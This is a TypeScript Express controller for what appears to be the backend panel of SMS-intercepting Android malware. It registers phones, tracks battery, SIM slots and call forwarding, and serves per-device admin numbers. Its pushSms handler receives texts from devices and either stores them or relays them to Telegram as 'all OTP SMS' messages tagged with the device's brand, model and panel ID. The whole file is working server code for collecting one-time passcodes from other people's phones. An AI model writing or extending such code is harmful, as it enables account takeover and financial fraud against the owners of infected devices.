import { Request, Response } from "express";
import logger from "../logger/logger";
import * as deviceService from "../services/deviceService";
import * as smsService from "../services/smsService";
import wsService from "../services/wsService";
import config from "../config";
import { sendTelegramMessage } from "../services/telegramService";
import { buildTelegramAllOtpSmsMessage } from "../utils/telegramMessage";

function clean(v: unknown): string {
  return String(v ?? "").trim();
}

function isSendSmsDisabled(): boolean {
  const value = clean(
    (config as any).sendSms || process.env.SENDSMS || "yes",
  ).toLowerCase();
  return value === "no";
}

function getDeviceTelegramMeta(device: any, deviceId: string) {
  return {
    pannelId: config.pannelId,
    deviceId,
    brandName: clean(
      device?.metadata?.brand || device?.metadata?.manufacturer || "",
    ),
    model: clean(device?.metadata?.model || ""),
    online: !!device?.status?.online,
    lastSeen: Number(
      device?.lastSeen?.at ||
        device?.status?.timestamp ||
        Date.now(),
    ),
  };
}

// ── FIX: doc store karo → WS broadcast → naya device panel mein live dikhega ──
export async function upsertDevice(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const body = req.body || {};
  try {
    const doc = await deviceService.upsertDeviceMetadata(deviceId, body);
    logger.info("controller: upsertDevice", { deviceId });
    try { if (doc) wsService.broadcastDeviceUpsert(doc); } catch {}
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: upsertDevice failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}

export async function updateLastSeen(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const { action, battery } = req.body || {};
  try {
    const doc = await deviceService.updateLastSeen(
      deviceId,
      typeof action === "string" ? action : "unknown",
      typeof battery === "number" ? battery : -1,
    );

    try {
      if (doc) {
        wsService.notifyDeviceLastSeen(deviceId, {
          at: Date.now(),
          action: typeof action === "string" ? action : "unknown",
          battery: typeof battery === "number" ? battery : -1,
        });
      }
    } catch {}

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: updateLastSeen failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}

export async function updateSimSlot(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const slot = req.params.slot;
  const { status, updatedAt } = req.body || {};
  try {
    await deviceService.updateSimSlot(
      deviceId,
      slot,
      status || "inactive",
      typeof updatedAt !== "undefined" ? Number(updatedAt) : undefined,
    );

    try {
      await deviceService.touchLastSeen(deviceId, "call_forwarded");
    } catch {}

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: updateSimSlot failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}

export async function upsertSimInfo(req: Request, res: Response) {
  const deviceId = req.params.deviceId;
  const simInfo = req.body || null;
  if (!simInfo)
    return res
      .status(400)
      .json({ success: false, error: "missing simInfo" });
  try {
    await deviceService.upsertSimInfo(deviceId, simInfo);
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: upsertSimInfo failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}

export async function getAdmins(req: Request, res: Response) {
  const id = req.params.id;
  try {
    const admins = await deviceService.getDeviceAdmins(id);
    return res.json(admins);
  } catch (err: any) {
    logger.error("controller: getAdmins failed", err);
    return res.status(500).json([]);
  }
}

export async function getAdminPhone(req: Request, res: Response) {
  const id = req.params.id;
  try {
    const phone = await deviceService.getDeviceAdminPhone(id);
    return res.json(phone);
  } catch (err: any) {
    logger.error("controller: getAdminPhone failed", err);
    return res.status(500).json("");
  }
}

export async function getForwardingSim(req: Request, res: Response) {
  const id = req.params.id;
  try {
    const device = await deviceService.getDevice(id);
    const forwarding = (device as any)?.forwardingSim || "auto";
    return res.json(forwarding);
  } catch (err: any) {
    logger.error("controller: getForwardingSim failed", err);
    return res.status(500).json("auto");
  }
}

export async function pushSms(req: Request, res: Response) {
  const id = req.params.id;
  const body = req.body || {};
  try {
    const payload = {
      sender: body.sender || body.from || "unknown",
      receiver: body.receiver || body.recv || "",
      title: body.title || "",
      body: body.body || body.message || "",
      timestamp: Number(body.timestamp || Date.now()),
      meta: body.meta || {},
    };

    if (isSendSmsDisabled()) {
      try {
        const device = await deviceService.getDevice(id);
        const meta = getDeviceTelegramMeta(device, id);

        const telegramText = buildTelegramAllOtpSmsMessage({
          ...meta,
          smsText: clean(payload.body),
          smsTitle: clean(payload.title),
          sender: clean(payload.sender),
          receiver: clean(payload.receiver),
          timestamp: Number(payload.timestamp || Date.now()),
        });

        const result = await sendTelegramMessage({
          category: "all_otp_sms" as any,
          text: telegramText,
        });

        logger.info("controller: pushSms SENDSMS=no routed only to Telegram", {
          deviceId: id,
          ok: result.ok,
          skipped: result.skipped,
          error: result.error,
        });
      } catch (telegramErr: any) {
        logger.error("controller: pushSms SENDSMS=no telegram failed", {
          deviceId: id,
          error: telegramErr?.message || telegramErr,
        });
      }

      try {
        await deviceService.touchLastSeen(id, "sms_pushed");
      } catch {}

      return res.json({
        success: true,
        sendSmsDisabled: true,
        savedToDb: false,
        broadcastToFrontend: false,
      });
    }

    await smsService.saveSms(id, payload);

    try {
      await deviceService.touchLastSeen(id, "sms_pushed");
    } catch {}

    return res.json({
      success: true,
      sendSmsDisabled: false,
      savedToDb: true,
      broadcastToFrontend: false,
    });
  } catch (err: any) {
    logger.error("controller: pushSms failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}

export async function getDevice(req: Request, res: Response) {
  const deviceId = req.params.deviceId || req.params.id;
  try {
    const device = await deviceService.getDevice(deviceId);
    if (!device) {
      return res
        .status(404)
        .json({ success: false, error: "Device not found" });
    }
    return res.json(device);
  } catch (err: any) {
    logger.error("controller: getDevice failed", err);
    return res
      .status(500)
      .json({ success: false, error: err?.message || "server error" });
  }
}

export async function listDevices(_req: Request, res: Response) {
  try {
    const devices = await deviceService.getAllDevices();
    return res.json(devices);
  } catch (err: any) {
    logger.error("controller: listDevices failed", err);
    return res.status(500).json([]);
  }
}
